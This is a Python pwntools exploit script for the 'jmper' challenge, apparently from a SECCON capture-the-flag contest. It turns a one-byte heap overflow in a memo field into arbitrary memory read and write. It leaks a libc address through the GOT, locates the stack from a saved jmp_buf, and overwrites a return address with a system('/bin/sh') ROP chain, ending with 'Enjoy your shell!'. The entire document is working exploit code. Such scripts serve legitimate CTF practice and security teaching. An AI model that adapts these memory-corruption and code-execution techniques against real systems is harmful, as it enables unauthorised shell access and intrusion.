from pwn import *

jmpbuf_offset = 0x110
second_offset = 0x250

#r = process('./jmper')
r=remote('jmper.pwn.seccon.jp', 5656)

# TODO: make sure sure this is right for local/remote
libc = ELF('jmper_libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


raw_input()

r.recv()
r.sendline("1")

# Memo to student 0 to leak malloc address
r.sendline("3")
r.sendline("0")
r.recvuntil("ID:")
r.sendline("A"*32)


r.sendline("5")
r.recvuntil("ID:")
r.sendline("0")

thing = r.recvuntil("1. Add")[32:-6]
thing += '\x00'*(4-len(thing))
heap_start = u32(thing) - 0x220
print "Got heap start @ {}".format(hex(heap_start))


r.sendline("1")

# Send memo to student 0 corrupting LSB of name ptr

r.sendline("3")
r.recvuntil("ID:")
r.sendline("0")

# Set name ptr to point to where next students name ptr is stored
r.sendline("A"*32+chr((second_offset&0xff) + 0x28))


def read(addr):
	# Name that student overwriting the name ptr of student 1
	r.sendline("2")
	r.recvuntil("ID:")
	r.sendline("0")

	r.sendline(p64(addr))

	# Read student[1] name to value at addr

	r.sendline("4")
	r.recvuntil("ID:")
	r.sendline("1")
	val = r.recvuntil("1. Add")[:-6]

	val += '\x00'*(8-len(val))
	return u64(val)


def write(addr, val):
	r.sendline("2")
	r.recvuntil("ID:")
	r.sendline("0")

	r.sendline(p64(addr))

	r.sendline("2")
	r.recvuntil("ID:")
	r.sendline("1")
	r.sendline(p64(val))


puts_addr = read(0x601fa0)
print "Resolved puts to be @ {}".format(hex(puts_addr))

libc.address = puts_addr - libc.symbols['puts']
print "Libc base @ {}".format(hex(libc.address))
system  = libc.symbols['system']
binsh =  next(libc.search('/bin/sh\x00'))

prdi = 0x00400cc3


stack_addr = read(heap_start + jmpbuf_offset + 0x18)

# Go to the constant offset from that stack addr where the current func
# return IP is and overwrite

stack_return = stack_addr-0xd8

print "Going to overwrite return address on stack @ {}".format(hex(stack_return))

write(stack_return, prdi)
write(stack_return+8, binsh)
write(stack_return+0x10, system)

# Create the rest of the students causing the jump

for _ in range(29):
	r.sendline("1")

print "Enjoy your shell!"

r.interactive()
